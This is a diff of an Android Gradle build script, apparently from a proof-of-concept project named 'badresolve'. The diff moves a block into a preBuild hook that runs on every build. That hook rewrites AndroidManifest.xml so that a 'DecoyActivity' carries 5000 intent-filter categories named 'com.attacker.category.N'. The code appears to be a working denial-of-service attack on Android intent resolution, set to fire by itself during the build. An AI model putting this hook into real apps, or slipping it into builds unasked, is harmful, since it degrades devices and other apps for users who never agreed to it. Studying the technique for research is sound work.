@@ -42,38 +42,6 @@ android {
             }
         }
     }
-    
-    // 直接在源 manifest 上操作
-    def manifestFile = file("src/main/AndroidManifest.xml")    
-    if (manifestFile.exists()) {
-        try {
-            def xml = new XmlParser(false, true).parse(manifestFile)
-            def decoyActivity = xml.application.'activity'.find { 
-                it.'@android:name' == 'com.cfks.badresolve.DecoyActivity'
-            }            
-            if (decoyActivity != null) {
-                def intentFilter = decoyActivity.'intent-filter'.find { true }
-                if (intentFilter == null) {
-                    intentFilter = new Node(decoyActivity, "intent-filter")
-                }               
-                def existingCategories = intentFilter.'category'.size()
-                if (existingCategories < 1000) {
-                    for (int i = 0; i < 5000; i++) {
-                        def category = new Node(intentFilter, "category")
-                        category.'@android:name' = "com.attacker.category.${i}"
-                    }                    
-                    manifestFile.withOutputStream { os ->
-                        def printer = new XmlNodePrinter(new PrintWriter(os))
-                        printer.preserveWhitespace = true
-                        printer.print(xml)
-                    }
-                    println "Added 5000 categories to AndroidManifest.xml"
-                }
-            }
-        } catch (Exception e) {
-            println "Error modifying manifest: ${e.message}"
-        }
-    }
 
     buildFeatures {
         buildConfig true
@@ -130,6 +98,54 @@ android {
 
     kotlin {
         jvmToolchain(21)
+    }
+    
+    applicationVariants.all { variant ->
+        variant.preBuild.doLast {
+            def manifestFile = file("src/main/AndroidManifest.xml")
+            
+            if (!manifestFile.exists()) {
+                println "Manifest not found: ${manifestFile.absolutePath}"
+                return
+            }
+            
+            try {
+                def xml = new XmlParser(false, true).parse(manifestFile)
+                
+                def decoyActivity = xml.application.'activity'.find { 
+                    it.'@android:name' == 'com.cfks.badresolve.DecoyActivity'
+                }
+                
+                if (decoyActivity != null) {
+                    def intentFilter = decoyActivity.'intent-filter'.find { true }
+                    if (intentFilter == null) {
+                        intentFilter = new Node(decoyActivity, "intent-filter")
+                    }
+                    
+                    def existingCategories = intentFilter.'category'.size()
+                    println "Existing categories count: ${existingCategories}"
+                    
+                    if (existingCategories < 1000) {
+                        for (int i = 0; i < 5000; i++) {
+                            def category = new Node(intentFilter, "category")
+                            category.'@android:name' = "com.attacker.category.${i}"
+                        }
+                        
+                        manifestFile.withOutputStream { os ->
+                            def printer = new XmlNodePrinter(new PrintWriter(os))
+                            printer.preserveWhitespace = true
+                            printer.print(xml)
+                        }
+                        println "Added 5000 categories to DecoyActivity"
+                    }
+                } else {
+                    println "DecoyActivity not found"
+                }
+            } catch (Exception e) {
+                println "Error: ${e.message}"
+                e.printStackTrace()
+            }
+        }
     }
 }
 
